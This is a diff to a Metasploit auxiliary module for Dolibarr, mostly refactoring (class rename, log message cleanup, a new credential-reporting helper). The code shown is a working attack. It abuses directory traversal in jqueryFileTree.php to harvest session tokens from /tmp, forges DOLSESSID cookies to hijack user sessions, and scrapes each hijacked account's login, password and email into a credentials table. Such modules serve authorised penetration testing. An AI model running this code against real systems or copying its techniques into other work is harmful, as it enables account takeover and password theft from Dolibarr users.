@@ -1,11 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
+class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
@@ -23,7 +21,7 @@ class Metasploit3 < Msf::Auxiliary
         Note: All tokens expire after 30 minutes of inactivity by default.
       },
       'License'        => MSF_LICENSE,
-      'Author'         => 'Brendan Coles <bcoles[at]gmail.com>',
+      'Author'         => 'bcoles',
       'References'     =>
         [
           ['URL', 'https://doliforge.org/tracker/?func=detail&aid=1212&group_id=144'],
@@ -34,7 +32,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         OptString.new('TARGETURI',      [true, 'The path to Dolibarr', '/dolibarr/']),
         OptString.new('TRAVERSAL_PATH', [true, 'The traversal path to the application tmp directory', '../../../../../../../../tmp/'])
-      ], self.class)
+      ])
   end
 
   #
@@ -42,7 +40,7 @@ class Metasploit3 < Msf::Auxiliary
   #
   def get_session_tokens
     tokens = nil
-    print_status("#{peer} - Finding session tokens...")
+    print_status("Finding session tokens...")
     res = send_request_cgi({
       'method'    => 'POST',
       'uri'       => normalize_uri(
@@ -52,15 +50,15 @@ class Metasploit3 < Msf::Auxiliary
       'vars_post' => { 'dir' => datastore['TRAVERSAL_PATH'] }
     })
     if !res
-      print_error("#{peer} - Connection failed")
+      print_error("Connection failed")
     elsif res.code == 404
-      print_error("#{peer} - Could not find 'jqueryFileTree.php'")
+      print_error("Could not find 'jqueryFileTree.php'")
     elsif res.code == 200 and res.body =~ />sess_([a-z0-9]+)</
       tokens = res.body.scan(/>sess_([a-z0-9]+)</)
       num_tokens = tokens.length.to_s.gsub(/(\d)(?=(\d\d\d)+(?!\d))/) { "#{$1}," }
-      print_good("#{peer} - Found #{num_tokens} session tokens")
+      print_good("Found #{num_tokens} session tokens")
     else
-      print_error("#{peer} - Could not find any session tokens")
+      print_error("Could not find any session tokens")
     end
     return tokens
   end
@@ -69,7 +67,7 @@ class Metasploit3 < Msf::Auxiliary
   # Get user's credentials
   #
   def get_user_info(user_id)
-    vprint_status("#{peer} - Retrieving user's credentials")
+    vprint_status("Retrieving user's credentials")
     res = send_request_cgi({
       'method'    => 'GET',
       'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
@@ -80,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
       }.to_a.shuffle]
     })
     if !res
-      print_error("#{peer} - Connection failed")
+      print_error("Connection failed")
     elsif res.body =~ /User card/
       record = [
         res.body.scan(/name="login" value="([^"]+)"/             ).flatten.first,
@@ -89,11 +87,11 @@ class Metasploit3 < Msf::Auxiliary
         res.body.scan(/name="email" class="flat" value="([^"]+)"/).flatten.first
       ]
       unless record.empty?
-        print_good("#{peer} - Found credentials (#{record[0]}:#{record[1]})")
+        print_good("Found credentials (#{record[0]}:#{record[1]})")
         return record
       end
     else
-      print_warning("#{peer} - Could not retrieve user credentials")
+      print_warning("Could not retrieve user credentials")
     end
   end
 
@@ -101,19 +99,18 @@ class Metasploit3 < Msf::Auxiliary
   # Verify if session cookie is valid and return user's ID
   #
   def get_user_id
-    # print_debug("#{peer} - Trying to hijack session '#{@cookie}'")
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
       'cookie'    => @cookie
     })
     if !res
-      print_error("#{peer} - Connection failed")
+      print_error("Connection failed")
     elsif res.body =~ /<div class="login"><a href="[^"]*\/user\/fiche\.php\?id=(\d+)">/
       user_id = "#{$1}"
-      vprint_good("#{peer} - Hijacked session for user with ID '#{user_id}'")
+      vprint_good("Hijacked session for user with ID '#{user_id}'")
       return user_id
     else
-      vprint_status("#{peer} - Could not hijack session. Session is invalid.")
+      vprint_status("Could not hijack session. Session is invalid.")
     end
   end
 
@@ -121,17 +118,16 @@ class Metasploit3 < Msf::Auxiliary
   # Construct cookie using token
   #
   def create_cookie(token)
-    # print_debug("#{peer} - Creating a cookie with token '#{token}'")
     res = send_request_cgi({
       'uri'       => normalize_uri(target_uri.path, 'user/fiche.php'),
       'cookie'    => "DOLSESSID_#{Rex::Text.rand_text_alphanumeric(10)}=#{token}"
     })
     if !res
-      print_error("#{peer} - Connection failed")
+      print_error("Connection failed")
     elsif res.code == 200 and res.get_cookies =~ /DOLSESSID_([a-f0-9]{32})=/
       return "DOLSESSID_#{$1}=#{token}"
     else
-      print_warning("#{peer} - Could not create session cookie")
+      print_warning("Could not create session cookie")
     end
   end
 
@@ -142,7 +138,7 @@ class Metasploit3 < Msf::Auxiliary
   def progress(current, total)
     done    = (current.to_f / total.to_f) * 100
     percent = "%3.2f%%" % done.to_f
-    vprint_status("#{peer} - Trying to hijack a session - " +
+    vprint_status("Trying to hijack a session - " +
       "%7s done (%d/%d tokens)" % [percent, current, total])
   end
 
@@ -153,10 +149,36 @@ class Metasploit3 < Msf::Auxiliary
     get_session_tokens ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe
   end
 
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
+  end
+
   def run
     return unless tokens = get_session_tokens
     credentials = []
-    print_status("#{peer} - Trying to hijack a session...")
+    print_status("Trying to hijack a session...")
     tokens.flatten.each_with_index do |token, index|
       if @cookie = create_cookie(token) and user_id = get_user_id
         credentials << get_user_info(user_id)
@@ -165,23 +187,23 @@ class Metasploit3 < Msf::Auxiliary
     end
 
     if credentials.empty?
-      print_warning("#{peer} - No credentials collected.")
+      print_warning("No credentials collected.")
       return
     end
-    cred_table = Rex::Ui::Text::Table.new(
+    cred_table = Rex::Text::Table.new(
       'Header'  => 'Dolibarr User Credentials',
       'Indent'  => 1,
       'Columns' => ['Username', 'Password', 'Admin', 'E-mail']
     )
     credentials.each do |record|
-      report_auth_info({
-        :host  => rhost,
-        :port  => rport,
-        :sname => (ssl ? 'https' : 'http'),
-        :user  => record[0],
-        :pass  => record[1],
-        :source_type => 'vuln'
-      })
+      report_cred(
+        ip: rhost,
+        port: rport,
+        service_name: (ssl ? 'https' : 'http'),
+        user: record[0],
+        password: record[1],
+        proof: @cookie
+      )
       cred_table << [record[0], record[1], record[2], record[3]]
     end
     print_line
